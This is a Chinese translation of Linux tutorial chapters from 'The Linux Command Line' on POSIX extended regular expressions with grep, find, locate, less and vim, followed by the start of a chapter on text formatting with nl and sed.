<h4 id="POSIX-基本与扩展正则表达式"><a href="#POSIX-基本与扩展正则表达式" class="headerlink" title="POSIX 基本与扩展正则表达式"></a>POSIX 基本与扩展正则表达式</h4><p>就在我们以为情况不可能变得更加混乱时，我们发现 POSIX 还将正则表达式的实现分为两种类型：<em>基本正则表达式（BRE）</em> 和 <em>扩展正则表达式（ERE）</em>。我们到目前为止所涉及的功能是任何符合 POSIX 标准并实现了 BRE 的应用程序所支持的。我们的 grep 程序就是这样一个程序。</p>
<p>BRE 和 ERE 之间的区别是什么？这是关于元字符的问题。在 BRE 中，以下元字符被识别：</p>
<p>**^ $ . [ ] ***</p>
<p>所有其他字符都被视为字面量。在 ERE 中，添加了以下元字符（及其相关功能）：</p>
<p><strong>( ) { } ? + |</strong></p>
<p>然而（这是有趣的部分），在 BRE 中，如果 (, ), {, 和 } 字符用反斜杠转义，则它们被视为元字符，而在 ERE 中，用反斜杠前置任何元字符会导致它被视为字面量。任何随之而来的怪异性都将在后面的讨论中涵盖。</p>
<p>由于我们接下来要讨论的功能是 ERE 的一部分，我们将需要使用不同的 grep。传统上，这是通过 egrep 程序完成的，但 GNU 版本的 grep 也支持使用 -E 选项时的扩展正则表达式。</p>
<h4 id="POSIX"><a href="#POSIX" class="headerlink" title="POSIX"></a>POSIX</h4><p>在 1980 年代，Unix 成为了一个非常流行的商业操作系统，但到了 1988 年，Unix 世界陷入了混乱。许多计算机制造商从其创造者 AT&amp;T 获得了 Unix 源代码的许可，并随其系统提供了各种版本的操作系统。然而，为了创造产品差异化，每个制造商都添加了专有的更改和扩展。这开始限制了软件的兼容性。一如既往，每个专有供应商都试图用他们的客户玩“锁定”游戏的获胜牌。今天，Unix 历史上的这段黑暗时期被称为“<em>巴尔干化</em>”。</p>
<p>电气和电子工程师学会（IEEE）出场了。在 20 世纪 80 年代中期，IEEE 开始制定一套标准，定义 Unix（和类 Unix）系统的性能。这些标准，正式称为 IEEE 1003，定义了标准类 Unix 系统上要找到的<em>应用程序接口</em>(API)、shell 和实用程序。POSIX（Portable Operating System Interface，可移植操作系统接口）这个名称是由理查德·斯托曼（没错，就是<em>那个</em>理查德·斯托曼）提出的，并被 IEEE 采纳。</p>
<h4 id="交替"><a href="#交替" class="headerlink" title="交替"></a>交替</h4><p>我们将讨论的第一个扩展正则表达式特性称为<em>交替</em>，它是允许从一组表达式中进行匹配的功能。就像括号表达式允许从指定的字符集中匹配单个字符一样，交替允许从一组字符串或其他正则表达式中进行匹配。</p>
<p>为了演示，我们将结合 echo 使用 grep。首先，让我们尝试一个普通的字符串匹配。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;AAA&quot;</span> | grep AAA</span><br><span class="line">AAA</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;BBB&quot;</span> | grep AAA</span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>这是一个非常直接的例子，我们将 echo 的输出管道传输到 grep 并看到结果。当匹配发生时，我们会看到它被打印出来；当没有</p>
<p>匹配发生时，我们看不到任何结果。</p>
<p>现在我们加入交替，用竖线元字符表示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;AAA&quot;</span> | grep -E <span class="string">&#x27;AAA|BBB&#x27;</span></span><br><span class="line">AAA</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;BBB&quot;</span> | grep -E <span class="string">&#x27;AAA|BBB&#x27;</span></span><br><span class="line">BBB</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;CCC&quot;</span> | grep -E <span class="string">&#x27;AAA|BBB&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>这里我们看到了正则表达式 ‘AAA|BBB’，意思是“匹配字符串 AAA 或字符串 BBB”。注意，由于这是一个扩展功能，我们添加了 -E 选项到 grep（虽然我们也可以只使用 egrep 程序），并将正则表达式用引号括起来以防止 shell 将竖线元字符解释为管道操作符。交替不限于两个选择。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;AAA&quot;</span> | grep -E <span class="string">&#x27;AAA|BBB|CCC&#x27;</span></span><br><span class="line">AAA</span><br></pre></td></tr></table></figure>

<p>要将交替与其他正则表达式元素结合起来，我们可以使用 () 来分隔交替。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -Eh <span class="string">&#x27;^(bz|gz|zip)&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<p>这个表达式将匹配我们列表中以 bz、gz 或 zip 开头的文件名。如果我们没有加上括号，这个正则表达式的含义就会变成匹配任何以 bz 开头<em>或包含</em> gz <em>或包含</em> zip 的文件名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -Eh <span class="string">&#x27;^bz|gz|zip&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<h4 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h4><p>扩展正则表达式支持几种指定元素匹配次数的方式，如下节所述。</p>
<h5 id="匹配一个元素零次或一次"><a href="#匹配一个元素零次或一次" class="headerlink" title="? - 匹配一个元素零次或一次"></a>? - 匹配一个元素零次或一次</h5><p>这个量词实际上意味着“使前面的元素变成可选的”。假设我们想检查一个电话号码的有效性，并且我们认为电话号码有效，如果它符合以下两种形式之一，其中 <em>n</em> 是一个数字：</p>
<p>(<em>nnn</em>) <em>nnn</em>-<em>nnnn 或 nnn</em> <em>nnn</em>-<em>nnnn</em></p>
<p>我们可以构造如下正则表达式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^\(?[0-9][0-9][0-9]\)? [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]$</span><br></pre></td></tr></table></figure>

<p>在这个表达式中，我们在括号字符后面加上问号，表示它们应该匹配零次或一次。再次强调，由于括号通常是 ERE 中的元字符，我们在它们前面加上反斜杠，使它们被视为字面量而不是元字符。</p>
<p>让我们试一试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;(555) 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9][0-9][0-9]</span></span><br><span class="line"><span class="string">\)? [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]$&#x27;</span></span><br><span class="line">(555) 123-4567</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;555 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9][0-9][0-9]\)</span></span><br><span class="line"><span class="string">? [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]$&#x27;</span></span><br><span class="line">555 123-4567</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;AAA 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9][0-9][0-9]\)</span></span><br><span class="line"><span class="string">? [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]$&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>我们看到，这个表达式匹配了电话号码的两种形式，但不匹配包含非数字字符的号码。这个表达式并不完美，因为它仍然允许区号周围的括号不匹配，但它可以执行验证的第一阶段。</p>
<h5 id="匹配一个元素零次或多次"><a href="#匹配一个元素零次或多次" class="headerlink" title="* - 匹配一个元素零次或多次"></a>* - 匹配一个元素零次或多次</h5><p>就像 ? 元字符一样，* 用于表示可选项；然而，不像 ?, 该项可以出现任意次数。假设我们想知道一个字符串是否是一个句子；也就是说，它以一个大写字母开头，然后包含任意数量的大写和小写字母以及空格，并以句号结尾。为了匹配这个（粗略的）句子定义，我们可以使用这样的正则表达式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[:upper:]][[:upper:][:lower:] ]*\.</span><br></pre></td></tr></table></figure>

<p>这个表达式由三个部分组成：一个包含 [:upper:] 字符类的括号表达式，一个包含 [:upper:]、[:lower:] 字符类和一个空格的括号表达式，以及一个用反斜杠转义的句号。第二个元素后面跟着一个 * 元字符，这样在我们句子中的首字母大写字母之后，任何数量的大写和小写字母以及空格都可以跟随，并且仍然匹配。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;This works.&quot;</span> | grep -E <span class="string">&#x27;[[:upper:]][[:upper:][</span></span><br><span class="line"><span class="string">:lower:] ]*\.&#x27;</span></span><br><span class="line">This works.</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;This Works.&quot;</span> | grep -E <span class="string">&#x27;[[:upper:]][[:upper:][</span></span><br><span class="line"><span class="string">:lower:] ]*\.&#x27;</span></span><br><span class="line">This Works.</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;this does</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> not&quot;</span> | grep -E <span class="string">&#x27;[[:upper:]][[:upper:</span></span><br><span class="line"><span class="string">][:lower:] ]*\.&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>这个表达式匹配了前两个测试，但不匹配第三个，因为它缺乏所需的首字母大写字符和末尾句号。</p>
<h5 id="匹配一个元素一次或多次"><a href="#匹配一个元素一次或多次" class="headerlink" title="+ - 匹配一个元素一次或多次"></a>+ - 匹配一个元素一次或多次</h5><ul>
<li>元字符的工作原理与 * 类似，但它要求至少有一个前面的元素实例才能进行匹配。这里有一个正则表达式，它只会匹配由单个空格分隔的一个或多个字母字符组成的行：</li>
</ul>
<p>^([[:alpha:]]+ ?)+$</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;This that&quot;</span> | grep -E <span class="string">&#x27;^([[:alpha:]]+ ?)+$&#x27;</span></span><br><span class="line">This that</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;a b c&quot;</span> | grep -E <span class="string">&#x27;^([[:alpha:]]+ ?)+$&#x27;</span></span><br><span class="line">a b c</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;a b 9&quot;</span> | grep -E <span class="string">&#x27;^([[:alpha:]]+ ?)+$&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;abc d&quot;</span> | grep -E <span class="string">&#x27;^([[:alpha:]]+ ?)+$&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>我们看到，这个表达式不匹配行 a b 9，因为它包含一个非字母字符；也不匹配 abc d，因为字符 c 和 d 之间用了多于一个的空格字符分隔。</p>
<h5 id="匹配一个元素特定次数"><a href="#匹配一个元素特定次数" class="headerlink" title="{ } - 匹配一个元素特定次数"></a>{ } - 匹配一个元素特定次数</h5><p>{ 和 } 元字符用于表示所需匹配次数的最小值和最大值。它们可以用四种可能的方式指定，如表 19-3 所述。</p>
<p><em>表 19-3: 指定匹配次数</em></p>
<table>
<thead>
<tr>
<th><strong>指定方式</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>{<em>n</em>}</td>
<td>如果前面的元素出现了确切的 <em>n</em> 次，则匹配该元素。</td>
</tr>
<tr>
<td>{<em>n</em>,<em>m</em>}</td>
<td>如果前面的元素出现了至少 <em>n</em> 次但不超过 <em>m</em> 次，则匹配该元素。</td>
</tr>
<tr>
<td>{<em>n</em>,}</td>
<td>如果前面的元素出现了 <em>n</em> 次或更多次，则匹配该元素。</td>
</tr>
<tr>
<td>{,<em>m</em>}</td>
<td>如果前面的元素出现不超过 <em>m</em> 次，则匹配该元素。</td>
</tr>
</tbody></table>
<p>回到我们之前的电话号码示例中，我们可以使用这种指定重复的方法来简化我们原来的正则表达式，从以下形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^\(?[0-9][0-9][0-9]\)? [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]$</span><br></pre></td></tr></table></figure>

<p>变为以下形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^\(?[0-9]&#123;3&#125;\)? [0-9]&#123;3&#125;-[0-9]&#123;4&#125;$</span><br></pre></td></tr></table></figure>

<p>让我们试一试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;(555) 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9]&#123;3&#125;\)? [0-</span></span><br><span class="line"><span class="string">9]&#123;3&#125;-[0-9]&#123;4&#125;$&#x27;</span></span><br><span class="line">(555) 123-4567</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;555 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9]&#123;3&#125;\)? [0-9]</span></span><br><span class="line"><span class="string">&#123;3&#125;-[0-9]&#123;4&#125;$&#x27;</span></span><br><span class="line">555 123-4567</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;5555 123-4567&quot;</span> | grep -E <span class="string">&#x27;^\(?[0-9]&#123;3&#125;\)? [0-9</span></span><br><span class="line"><span class="string">]&#123;3&#125;-[0-9]&#123;4&#125;$&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>正如我们所见，我们修改后的表达式可以成功验证有括号和没有括号的号码，同时拒绝那些格式不正确的号码。</p>
<h4 id="应用正则表达式"><a href="#应用正则表达式" class="headerlink" title="应用正则表达式"></a><strong>应用正则表达式</strong></h4><p>让我们看看一些我们已经熟悉的命令，以及如何将它们与正则表达式结合使用。</p>
<h5 id="使用-grep-验证电话列表"><a href="#使用-grep-验证电话列表" class="headerlink" title="使用 grep 验证电话列表"></a>使用 grep 验证电话列表</h5><p>在之前的例子中，我们检查了单个电话号码的格式是否正确。一个更现实的场景是检查一系列号码，因此让我们制作一个列表。我们通过对命令行念出一个神奇的咒语来做到这一点。这是因为我们还没有涉及大多数相关命令，但不用担心。我们将在未来的章节中了解它们。这是咒语：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;(<span class="variable">$&#123;RANDOM:0:3&#125;</span>) <span class="variable">$&#123;RANDOM:0:3&#125;</span>-<span class="variable">$&#123;RANDOM:0:4&#125;</span>&quot;</span> &gt;&gt; phonelist.txt; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这个命令将生成一个名为 phonelist.txt 的文件，包含十个电话号码。每次重复该命令时，另外十个号码将被添加到列表中。我们还可以更改命令开头附近的值 10，以产生更多或更少的电话号码。但是，如果我们检查文件的内容，我们会发现有一个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> phonelist.txt</span><br><span class="line">(232) 298-2265</span><br><span class="line">(624) 381-1078</span><br><span class="line">(540) 126-1980</span><br><span class="line">(874) 163-2885</span><br><span class="line">(286) 254-2860</span><br><span class="line">(292) 108-518</span><br><span class="line">(129) 44-1379</span><br><span class="line">(458) 273-1642</span><br><span class="line">(686) 299-8268</span><br><span class="line">(198) 307-2440</span><br></pre></td></tr></table></figure>

<p>有些号码格式不正确，这正好适合我们的目的，因为我们将使用 grep 来验证它们。</p>
<p>一种有用的验证方法是扫描文件中的无效号码并显示结果列表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -Ev <span class="string">&#x27;^\([0-9]&#123;3&#125;\) [0-9]&#123;3&#125;-[0-9]&#123;4&#125;$&#x27;</span> phonelist.txt</span><br><span class="line">(292) 108-518</span><br><span class="line">(129) 44-1379</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>在这里，我们使用 -v 选项产生反向匹配，以便仅输出列表中不匹配指定表达式的行。表达式本身包括两端的锚点元字符，以确保号码两端没有额外的字符。与我们之前的电话号码示例不同，这个表达式还要求有效号码中必须有括号。</p>
<h5 id="使用-find-查找丑陋的文件名"><a href="#使用-find-查找丑陋的文件名" class="headerlink" title="使用 find 查找丑陋的文件名"></a>使用 find 查找丑陋的文件名</h5><p>find 命令支持基于正则表达式的测试。在使用正则表达式与 find 相对于 grep 时，需要牢记一个重要的考虑。虽然 grep 会在行<em>包含</em>匹配表达式的字符串时打印该行，find 则要求路径名<em>完全匹配</em>正则表达式。在下面的例子中，我们将使用 find 和一个正则表达式来查找包含以下任何不属于以下集合的字符的每个路径名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-_./0-9a-zA-Z]</span><br></pre></td></tr></table></figure>

<p>这样的扫描将揭示包含嵌入空格和其他潜在攻击性字符的路径名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find . -regex <span class="string">&#x27;.*[^-_./0-9a-zA-Z].*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于完全匹配整个路径名的要求，我们在表达式的两端使用 .* 来匹配任意字符的零个或多个实例。在表达式中间，我们使用一个否定的括号表达式，其中包含我们可以接受的路径名字符集。</p>
<h5 id="使用-locate-搜索文件"><a href="#使用-locate-搜索文件" class="headerlink" title="使用 locate 搜索文件"></a>使用 locate 搜索文件</h5><p>locate 程序支持基本（–regexp 选项）和扩展（-regex 选项）正则表达式。使用它，我们可以执行许多我们之前使用 dir</p>
<p>list 文件进行的相同操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ locate --regex <span class="string">&#x27;bin/(bz|gz|zip)&#x27;</span></span><br><span class="line">/bin/bzcat</span><br><span class="line">/bin/bzcmp</span><br><span class="line">/bin/bzdiff</span><br><span class="line">/bin/bzegrep</span><br><span class="line">/bin/bzexe</span><br><span class="line">/bin/bzfgrep</span><br><span class="line">/bin/bzgrep</span><br><span class="line">/bin/bzip2</span><br><span class="line">/bin/bzip2recover</span><br><span class="line">/bin/bzless</span><br><span class="line">/bin/bzmore</span><br><span class="line">/bin/gzexe</span><br><span class="line">/bin/gzip</span><br><span class="line">/usr/bin/zip </span><br><span class="line">/usr/bin/zipcloak</span><br><span class="line">/usr/bin/zipgrep</span><br><span class="line">/usr/bin/zipinfo</span><br><span class="line">/usr/bin/zipnote</span><br><span class="line">/usr/bin/zipsplit </span><br></pre></td></tr></table></figure>

<p>使用交替，我们执行了对包含 bin&#x2F;bz、bin&#x2F;gz 或 &#x2F;bin&#x2F;zip 的路径名的搜索。</p>
<h5 id="使用-less-和-vim-搜索文本"><a href="#使用-less-和-vim-搜索文本" class="headerlink" title="使用 less 和 vim 搜索文本"></a>使用 less 和 vim 搜索文本</h5><p>less 和 vim 共享相同的搜索文本方法。按下 &#x2F; 键后跟一个正则表达式将执行搜索。如果我们使用 less 查看我们的 phonelist.txt 文件，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ less phonelist.txt</span><br></pre></td></tr></table></figure>

<p>然后搜索我们的验证表达式，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(232) 298-2265</span><br><span class="line">(624) 381-1078</span><br><span class="line">(540) 126-1980</span><br><span class="line">(874) 163-2885</span><br><span class="line">(286) 254-2860</span><br><span class="line">(292) 108-518</span><br><span class="line">(129) 44-1379</span><br><span class="line">(458) 273-1642</span><br><span class="line">(686) 299-8268</span><br><span class="line">(198) 307-2440</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">/^\([0-9]&#123;3&#125;\) [0-9]&#123;3&#125;-[0-9]&#123;4&#125;$</span><br></pre></td></tr></table></figure>

<p>less 将高亮显示匹配的字符串，使无效的号码容易辨认。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(232) 298-2265</span><br><span class="line">(624) 381-1078</span><br><span class="line">(540) 126-1980 </span><br><span class="line">(874) 163-2885</span><br><span class="line">(286) 254-2860</span><br><span class="line">(292) 108-518</span><br><span class="line">(129) 44-1379</span><br><span class="line">(458) 273-1642</span><br><span class="line">(686) 299-8268</span><br><span class="line">(198) 307-2440</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure>

<p>另一方面，vim 支持基本正则表达式，因此我们的搜索表达式看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/([0-9]\&#123;3\&#125;) [0-9]\&#123;3\&#125;-[0-9]\&#123;4\&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，表达式大体相同；然而，许多在扩展表达式中被视为元字符的字符在基本表达式中被视为字面量。只有在用反斜杠转义时，它们才被视为元字符。根据我们系统上 vim 的特定配置，匹配可能会被高亮显示。如果没有，尝试这个命令模式命令来激活高亮显示：</p>
<p><strong>:hlsearch</strong></p>
<p><strong>注意：</strong> 根据您的发行版，vim 可能支持或不支持文本搜索高亮显示。特别是 Ubuntu，默认提供了 vim 的精简版本。在这样的系统上，您可能想使用包管理器安装更完整的 vim 版本。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在这一章中，我们看到了正则表达式的一些用途。如果我们使用正则表达式搜索更多使用它们的应用程序，我们可以找到更多用途。我们可以通过搜索手册页来做到这一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> /usr/share/man/man1</span><br><span class="line">[me@linuxbox man1]$ zgrep -El <span class="string">&#x27;regex|regular expression&#x27;</span> *.gz</span><br></pre></td></tr></table></figure>

<p>zgrep 程序为 grep 提供了一个前端，允许它读取压缩文件。</p>
<p>在我们的示例中，我们搜索通常位置的压缩第 1 部分手册页文件。这个命令的结果是包含字符串 regex 或字符串 regular expression 的文件列表。正如我们所见，正则表达式出现在许多程序中。</p>
<p>基本正则表达式中有一个我们没有涵盖的功能。称为<em>反向引用</em>，这个功能将在下一章中讨论。</p>
<h4 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h4><p>有许多在线资源可以学习正则表达式，包括各种教程和速查表。</p>
<p>此外，维基百科有关于以下背景主题的良好文章：</p>
<ul>
<li>POSIX：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Qb3NpeA==">http://en.wikipedia.org/wiki/Posix<i class="fa fa-external-link-alt"></i></span></li>
<li>ASCII：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Bc2NpaQ==">http://en.wikipedia.org/wiki/Ascii<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化输出</title>
    <url>/2024/04/21-formatting-output/</url>
    <content><![CDATA[<h2 id="21-格式化输出"><a href="#21-格式化输出" class="headerlink" title="21 - 格式化输出"></a>21 - 格式化输出</h2><p>在本章中，我们将继续探讨与文本相关的工具，重点关注用于格式化文本输出的程序，而不是改变文本本身。这些工具通常用于准备最终打印的文本，这是我们将在下一章中讨论的主题。我们将介绍以下程序：</p>
<ul>
<li><p>nl - 编号行</p>
</li>
<li><p>fold - 将每行文本折叠到指定长度</p>
</li>
</ul>
<span id="more"></span>

<ul>
<li><p>fmt - 一个简单的文本格式化工具</p>
</li>
<li><p>pr - 准备文本以供打印</p>
</li>
<li><p>printf - 格式化并打印数据</p>
</li>
<li><p>groff - 一个文档格式化系统</p>
</li>
</ul>
<h3 id="简单格式化工具"><a href="#简单格式化工具" class="headerlink" title="简单格式化工具"></a>简单格式化工具</h3><p>我们首先来看一些简单的格式化工具。这些工具大多是单一用途的程序，在功能上比较简单，但它们可以用于小任务以及作为管道和脚本的一部分。</p>
<h4 id="nl-–-编号行"><a href="#nl-–-编号行" class="headerlink" title="nl – 编号行"></a>nl – 编号行</h4><p>nl 程序是一个用于执行简单任务的相当古老的工具。它对行进行编号。在最简单的用法中，它类似于 cat -n。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">nl</span> distros.txt | <span class="built_in">head</span></span><br><span class="line"> 1 SUSE 10.2 12/07/2006</span><br><span class="line"> 2 Fedora 10 11/25/2008</span><br><span class="line"> 3 SUSE 11.0 06/19/2008</span><br><span class="line"> 4 Ubuntu 8.04 04/24/2008</span><br><span class="line"> 5 Fedora 8 11/08/2007</span><br><span class="line"> 6 SUSE 10.3 10/04/2007</span><br><span class="line"> 7 Ubuntu 6.10 10/26/2006</span><br><span class="line"> 8 Fedora 7 05/31/2007</span><br><span class="line"> 9 Ubuntu 7.10 10/18/2007</span><br><span class="line"> 10 Ubuntu 7.04 04/19/2007</span><br></pre></td></tr></table></figure>

<p>就像 cat 一样，nl 可以接受多个文件作为命令行参数，或者接受标准输入。然而，nl 有许多选项，并支持一种原始形式的标记，以允许更复杂的编号方式。</p>
<p>nl 支持所谓的“逻辑页面”概念进行编号。这允许 nl 在编号时重置（重新开始）数字序列。使用选项，可以将起始数字设置为特定值，并且在有限的范围内，还可以设置其格式。逻辑页面进一步分为头部、主体和尾部。在这些部分中，行编号可能被重置和&#x2F;或被分配不同的样式。如果给 nl 提供多个文件，它将它们视为单一的文本流。文本流中的部分由一些相当奇怪的标记的存在来指示，如表 21-1 所述。</p>
<p><em>表 21-1: nl 标记</em></p>
<table>
<thead>
<tr>
<th><strong>标记</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\:\:\:</td>
<td>开始逻辑页面头部</td>
</tr>
<tr>
<td>\:\:</td>
<td>开始逻辑页面主体</td>
</tr>
<tr>
<td>\:</td>
<td>开始逻辑页面尾部</td>
</tr>
</tbody></table>
<p>表 21-1 中列出的每个标记元素必须单独出现在其自己的行上。处理标记元素后，nl 会从文本流中删除它。</p>
<p>表 21-2 列出了 nl 的常用选项。</p>
<p><em>表 21-2: 常用 nl 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-b <em>style</em></td>
<td>设置主体编号为 <em>style</em>，其中 <em>style</em> 可以是以下之一：a &#x3D; 编号所有行 t &#x3D; 仅编号非空白行。这是默认值。n &#x3D; 无p<em>regexp</em> &#x3D; 仅编号与基本正则表达式 <em>regexp</em> 匹配的行。</td>
</tr>
<tr>
<td>-f <em>style</em></td>
<td>设置尾部编号为 <em>style</em>。默认值为 n（无）。</td>
</tr>
<tr>
<td>-h <em>style</em></td>
<td>设置头部编号为 <em>style</em>。默认值为 n（无）。</td>
</tr>
<tr>
<td>-i <em>number</em></td>
<td>设置页面编号增量为 <em>number</em>。默认值为一。</td>
</tr>
<tr>
<td>-n <em>format</em></td>
<td>将编号格式设置为 <em>format</em>，其中 <em>format</em> 可以是以下之一：ln &#x3D; 左对齐，不带前导零。rn &#x3D; 右对齐，不带前导零。这是默认值。rz &#x3D; 右对齐，带前导零。</td>
</tr>
<tr>
<td>-p</td>
<td>不在每个逻辑页面的开始处重置页面编号。</td>
</tr>
<tr>
<td>-s <em>string</em></td>
<td>在每个行号后添加 <em>string</em> 以创建分隔符。默认值是一个制表符。</td>
</tr>
<tr>
<td>-v <em>number</em></td>
<td>将每个逻辑页面的第一行号设置为 <em>number</em>。默认值为一。</td>
</tr>
<tr>
<td>-w <em>width</em></td>
<td>将行号字段的宽度设置为 <em>width</em>。默认值为 6。</td>
</tr>
</tbody></table>
<p>虽然我们可能不会经常编号行，但我们可以使用 nl 来看看我们如何可以结合多个工具来执行更复杂的任务。我们将在上一章的工作基础上，生成一个 Linux 发行版报告。由于我们将使用 nl，因此将其头部&#x2F;主体&#x2F;尾部标记包含在内会很有用。为此，我们将把它添加到上一章的 sed 脚本中。使用文本编辑器，我们将脚本更改如下并将其保存为 distros-nl.sed：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sed 脚本生成 Linux 发行版报告</span></span><br><span class="line">1 i\</span><br><span class="line">\\:\\:\\:\</span><br><span class="line">\</span><br><span class="line">Linux 发行版报告\</span><br><span class="line">\</span><br><span class="line">名称 版本 发布日期\</span><br><span class="line">---- ---- --------\</span><br><span class="line">\\:\\:</span><br><span class="line">s/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;4\&#125;\)$/\3-\1-\2/</span><br><span class="line">$ a\</span><br><span class="line">\\:\</span><br><span class="line">\</span><br><span class="line">报告结束</span><br></pre></td></tr></table></figure>

<p>脚本现在插入了 nl 逻辑页面标记，并在报告的末尾添加了一个尾部。注意，我们必须在标记中加倍使用反斜杠，因为它们通常被 sed 解释为转义字符。</p>
<p>接下来，我们将通过结合 sort、sed 和 nl 来生成我们的增强报告。</p>
